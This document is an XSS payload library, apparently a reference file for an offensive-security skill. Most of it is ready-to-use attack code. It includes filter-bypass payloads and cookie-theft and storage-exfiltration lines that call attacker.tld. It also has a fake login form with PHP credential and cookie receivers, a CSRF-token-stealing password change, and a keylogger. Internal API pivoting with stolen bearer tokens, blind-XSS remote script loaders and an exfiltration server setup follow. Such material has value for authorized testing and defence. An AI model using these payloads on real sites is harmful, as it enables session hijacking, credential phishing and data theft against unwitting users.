# XSS Payloads — Consolidated Library

Reference companion to `SKILL.md`. Pull from here when you need a specific payload class — the SKILL.md keeps only top-line examples; this file is the bench.

External resources to also consider:
- PortSwigger XSS Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PayloadsAllTheThings XSS — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- HTML5 Security Cheatsheet — https://html5sec.org/
- OWASP XSS Filter Evasion — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- XSS without Parentheses — https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
- JSONBee (CSP-bypass JSONP endpoints) — https://github.com/zigoo0/JSONBee
- ezXSS endpoint (ours) — `YOUR_EZXSS_DOMAIN`

---

## 1. Detection — first-pass payloads

Tier 1 — fastest, drop these in any new field:

```
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
<img src="" onerror=alert(window.origin)>
<svg onload=alert(window.origin)>
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
```

Tier 2 — when Tier 1 reflected but didn't execute:

```
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg/onload=alert(1)>
<details ontoggle=alert(1) open>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
<form action="javascript:alert(1)"><input type=submit>
<isindex action="javascript:alert(1)" type=submit value=click>
```

---

## 2. Context-specific breakouts

### Inside HTML attribute (double-quoted)
```
" autofocus onfocus=alert(1) x="
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

### Inside HTML attribute (single-quoted)
```
' autofocus onfocus=alert(1) x='
'><img src=x onerror=alert(1)>
```

### Inside HTML attribute (unquoted)
```
 onmouseover=alert(1) x=
 autofocus onfocus=alert(1)
```

### Inside `<script>` block (double-quoted JS string)
```
";alert(1);//
";alert(1);var x="
"-alert(1)-"
```

### Inside `<script>` block (single-quoted JS string)
```
';alert(1);//
'-alert(1)-'
```

### Inside `<script>` block (template literal)
```
${alert(1)}
`;alert(1);//
```

### Inside JS comment
```
*/alert(1);//
```

### Inside `<style>` block
```
</style><script>alert(1)</script>
</style><svg onload=alert(1)>
```

### Inside HTML comment
```
--><script>alert(1)</script>
```

### Inside textarea
```
</textarea><script>alert(1)</script>
</textarea><svg onload=alert(1)>
```

### Inside title
```
</title><script>alert(1)</script>
```

### URL/href context (no breakout needed)
```
javascript:alert(1)
javascript:alert(window.origin)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## 3. Filter-bypass techniques

### 3.1 Casing variants
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<object data="JaVaScRiPt:alert(1)">
```

### 3.2 Recursive strip bypass
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr<<script>script>ipt>alert(1)</scr</script>ipt>
```

### 3.3 No-space variants
```
<svg/onload=alert(1)>
<img/src/onerror=alert(1)>
<script/src=YOUR_EZXSS_DOMAIN/x></script>
<svg><animate/onbegin=alert(1) attributeName=x>
```

### 3.4 Event handler grab-bag (when a few are blacklisted)
`onload`, `onerror`, `onfocus`, `onblur`, `onmouseover`, `onmouseenter`, `onmouseleave`, `onmousemove`, `onclick`, `ondblclick`, `oncontextmenu`, `onkeydown`, `onkeyup`, `onkeypress`, `onsubmit`, `onreset`, `onchange`, `oninput`, `onselect`, `oncopy`, `oncut`, `onpaste`, `oncanplay`, `oncanplaythrough`, `ondurationchange`, `onemptied`, `onended`, `onloadeddata`, `onloadedmetadata`, `onloadstart`, `onpause`, `onplay`, `onplaying`, `onprogress`, `onratechange`, `onseeked`, `onseeking`, `onstalled`, `onsuspend`, `ontimeupdate`, `onvolumechange`, `onwaiting`, `ontoggle`, `onanimationstart`, `onanimationend`, `onanimationiteration`, `ontransitionend`, `onpointerdown`, `onpointerup`, `onwheel`

### 3.5 Encoded `alert(1)` — string forms
```
"alert(1)"     // unicode
"\141\154\145\162\164\50\61\51"                          // octal
"\x61\x6c\x65\x72\x74\x28\x31\x29"                       // hex
atob("YWxlcnQoMSk=")                                     // base64
String.fromCharCode(97,108,101,114,116,40,49,41)         // charcode
/alert(1)/.source                                        // regex source
decodeURI(/alert(%22xss%22)/.source)                     // url-encoded source
```

### 3.6 Execution sinks (string → execution)
```js
eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor("alert(1)")()
[].constructor.constructor(atob("YWxlcnQoMSk="))()
```

### 3.7 Combined encoded + sink
```js
eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()
```

### 3.8 Without parentheses
```
<svg onload=alert`1`>
<svg><script>alert`1`</script>
<img src=x onerror="window['ale'+'rt'](1)">
<a onclick="throw onerror=alert,'xss'" href=#>click</a>
```

### 3.9 Double-URL-encoded (against pre-decode WAFs)
```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

### 3.10 HTML entity encoded (against template engines that decode entities)
```
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
```

---

## 4. Cookie theft / session hijacking

### 4.1 HTTPS-aware fetch (preferred for modern targets)
```html
<script>fetch(`https://attacker.tld/log?cookie=${btoa(document.cookie)}`)</script>
```

### 4.2 Image-source variant (passes through CSP `img-src` if `connect-src` blocks fetch)
```js
new Image().src='https://attacker.tld/log?c='+document.cookie;
```

### 4.3 No-interaction animation trigger
```html
<style>@keyframes x{}</style>
<video style="animation-name:x" onanimationend="window.location='https://attacker.tld/log?c='+document.cookie"></video>
```

### 4.4 Stealthy on-hover variant
```html
<h1 onmouseover='document.write(`<img src="https://attacker.tld/?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

### 4.5 Remote-script loader (when injection point is short)
```html
<script src=//attacker.tld/x></script>
<script src=YOUR_EZXSS_DOMAIN/<fieldname>></script>
```
Then attacker.tld/x is your full payload — keep injection point small.

### 4.6 Cookie receiver (PHP, with redirect)
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
    header("Location: https://target.tld/");
}
?>
```
Run with: `sudo php -S 0.0.0.0:80`

---

## 5. Phishing — fake login form

### 5.1 Inject the form, remove original UI, comment trailing HTML
```js
document.write('<h3>Please login to continue</h3><form action=https://attacker.tld><input name="username" placeholder="Username"><input type=password name="password" placeholder="Password"><input type=submit value="Login"></form>');
document.getElementById('urlform').remove();
```

Append `<!--` to comment trailing original HTML if it bleeds into your form.

### 5.2 Phishing receiver (PHP, with stealthy redirect back)
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: https://target.tld/login");
    fclose($file);
    exit();
}
?>
```

---

## 6. In-session action / account takeover

### 6.1 GET CSRF token, then POST password change
```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrf = encodeURIComponent(doc.getElementById('csrf_token').value);

var post = new XMLHttpRequest();
post.open('POST', '/home.php', false);
post.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
post.withCredentials = true;
post.send(`username=admin&email=admin@x.tld&password=pwned&csrf_token=${csrf}`);
```

### 6.2 Bypass same-origin/SameSite CSRF protection via stored XSS
The XHR is same-origin so SameSite=Lax doesn't apply, and Origin/Referer are correct:
```js
var req = new XMLHttpRequest();
req.onload = function() {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf=' + token + '&action=change');
};
req.open('get', '/app/change-visibility', true);
req.send();
```

---

## 7. Data exfiltration

### 7.1 Exfiltrate any page victim can see
```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () => {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.X.X:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();
```

### 7.2 Exfiltrate localStorage / sessionStorage
```js
fetch(`https://attacker.tld/log?ls=${btoa(JSON.stringify(localStorage))}&ss=${btoa(JSON.stringify(sessionStorage))}`);
```

### 7.3 Exfiltrate forms/inputs visible on the page
```js
var data = {};
document.querySelectorAll('input,textarea').forEach(el => data[el.name||el.id] = el.value);
fetch(`https://attacker.tld/log?d=${btoa(JSON.stringify(data))}`);
```

### 7.4 Keylogger
```js
document.addEventListener('keypress', e => {
    fetch(`https://attacker.tld/log?k=${e.key}`);
});
```

---

## 8. Internal pivot via XSS

### 8.1 Probe internal app, debug CORS errors
```js
try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://internal.target.tld/', false);
    xhr.withCredentials = true;
    xhr.send();
    var msg = xhr.responseText;
} catch (error) {
    var msg = error.toString();
}
var exfil = new XMLHttpRequest();
exfil.open("POST", "https://10.10.X.X:4443/log", true);
exfil.setRequestHeader("Content-Type", "application/json");
exfil.send(JSON.stringify({data: btoa(msg)}));
```

### 8.2 Internal API endpoint bruteforce
```js
var endpoints = ['account','accounts','admin','api-key','balance','config','customer','email','login','logs','password','profile','session','settings','token','user','users'];
for (var i in endpoints) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', `https://api.internal.tld/v1/${endpoints[i]}`, false);
        xhr.send();
        if (xhr.status != 404) {
            var exfil = new XMLHttpRequest();
            exfil.open("POST", "https://10.10.X.X:4443/log", true);
            exfil.setRequestHeader("Content-Type", "application/json");
            exfil.send(JSON.stringify({data: btoa(`${endpoints[i]} :: ${xhr.status} :: ${xhr.responseText.substring(0,200)}`)}));
        }
    } catch {}
}
```

### 8.3 Bearer token from localStorage for internal API
```js
var t = localStorage.getItem('auth_token') || localStorage.getItem('access_token') || localStorage.getItem('jwt');
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal.tld/admin', false);
xhr.setRequestHeader('Authorization', 'Bearer ' + t);
xhr.send();
fetch(`https://attacker.tld/log?d=${btoa(xhr.responseText)}`);
```

---

## 9. Blind XSS payload set (ezXSS)

Always include the field name in the URL to trace which input fired:

```html
<script src="YOUR_EZXSS_DOMAIN/full_name"></script>
'><script src="YOUR_EZXSS_DOMAIN/full_name"></script>
"><script src="YOUR_EZXSS_DOMAIN/full_name"></script>
<script src=YOUR_EZXSS_DOMAIN/full_name></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'YOUR_EZXSS_DOMAIN/full_name\';document.body.appendChild(a)')
<svg onload="var s=document.createElement('script');s.src='YOUR_EZXSS_DOMAIN/full_name';document.body.appendChild(s)">
<script>$.getScript("YOUR_EZXSS_DOMAIN/full_name")</script>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","YOUR_EZXSS_DOMAIN/full_name");a.send();</script>
<img src=x onerror="fetch('YOUR_EZXSS_DOMAIN/full_name').then(r=>r.text()).then(eval)">
```

Also try in HTTP headers (often logged + rendered in admin views):
- `User-Agent: <script src=YOUR_EZXSS_DOMAIN/ua></script>`
- `Referer: YOUR_EZXSS_DOMAIN/referer/<script>...</script>`
- `X-Forwarded-For: <img src=x onerror=fetch('YOUR_EZXSS_DOMAIN/xff')>`

---

## 10. SVG / file upload XSS

### 10.1 Standalone SVG with XSS
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(document.domain)</script>
</svg>
```

### 10.2 SVG with cookie exfil
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.tld/log?c='+btoa(document.cookie))"/>
```

### 10.3 SVG with embedded foreignObject (richer payload context)
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(document.domain)</script>
    </body>
  </foreignObject>
</svg>
```

---

## 11. WebSocket-delivered XSS

When the app pipes WS messages into `innerHTML` (script tags don't execute via innerHTML — use event handlers):
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<img src=x onerror="fetch('https://attacker.tld/log?c='+document.cookie)">
```

---

## 12. CSP-bypass payloads (top hits)

See `csp-bypass.md` for full methodology. Quick payloads:

### 12.1 JSONP via Google (when google domains are in script-src)
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

### 12.2 Self + file upload
If `script-src 'self'` and the app has file upload that allows arbitrary content-type:
```html
<script src="/uploads/avatar.jpg.js"></script>
```
Where the uploaded file (named `.jpg.js` or content-typed `application/javascript`) contains JS.

### 12.3 unsafe-inline still set
Plain payload works:
```html
<script>alert(1)</script>
```

### 12.4 unsafe-eval still set, inline blocked
```html
<script src="//attacker.tld/x.js"></script>
```
Or use a sink-based payload via an allowlisted CDN.

---

## 13. HTTPS Exfil Server setup

Required when the target is HTTPS (modern browsers refuse mixed-content resource loads).

### 13.1 Generate self-signed cert
```bash
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

### 13.2 Python HTTPS server
```python
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

### 13.3 Test
```bash
curl -vk https://127.0.0.1:4443/test?hello=world
```

### 13.4 Logging variant (Python with body capture)
```python
from http import server
import ssl, json

class H(server.BaseHTTPRequestHandler):
    def do_POST(self):
        l = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(l).decode('utf-8', errors='replace')
        print(f"[POST {self.path}] {body}")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
    def do_GET(self):
        print(f"[GET {self.path}]")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.end_headers()

httpd = server.HTTPServer(('0.0.0.0', 4443), H)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

---

## 14. Discovery tools

### XSStrike
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "https://target.tld/page?param=test"
```

Notes:
- Run only with user authorization — XSStrike is high-volume and trips rate limits.
- Useful as a sanity check after manual fails.
- Not always reliable — manual code review beats automated discovery for mature targets.

### Other automated tools (mention only)
- BruteXSS — https://github.com/rajeshmajumdar/BruteXSS
- XSSer — https://github.com/epsylon/xsser
- Burp Active Scan — Pro only, we don't have it.

---

## 15. Quick-reference: payload selection by injection context

| Context | Try first |
|---|---|
| HTML body, no filtering | `<script>alert(window.origin)</script>` |
| HTML body, `<script>` blocked | `<svg onload=alert(1)>` or `<img src=x onerror=alert(1)>` |
| Inside attribute, double-quoted | `" onmouseover=alert(1) x="` |
| Inside attribute, single-quoted | `' onmouseover=alert(1) x='` |
| Inside `<script>` JS string | `";alert(1);//` |
| Inside `<script>` template literal | `${alert(1)}` |
| Inside href/src URL | `javascript:alert(1)` |
| Inside `<style>` block | `</style><svg onload=alert(1)>` |
| Inside HTML comment | `--><svg onload=alert(1)>` |
| Inside textarea | `</textarea><svg onload=alert(1)>` |
| DOM sink via fragment | `https://t/#x=<img src=x onerror=alert(1)>` |
| Blind (admin-rendered) | `<script src=YOUR_EZXSS_DOMAIN/<field>></script>` |
| CSP with allowed CDN | JSONP from JSONBee list |
| Strong CSP, file upload allowed | upload `.js`, load via `<script src=/uploads/...>` |
| WebSocket message → innerHTML | `<img src=x onerror=alert(1)>` (no `<script>`) |
| SVG upload allowed | `<svg onload=alert(1)>` as `.svg` |
| API JSON response loaded directly in URL bar | URL-encoded payload as param |
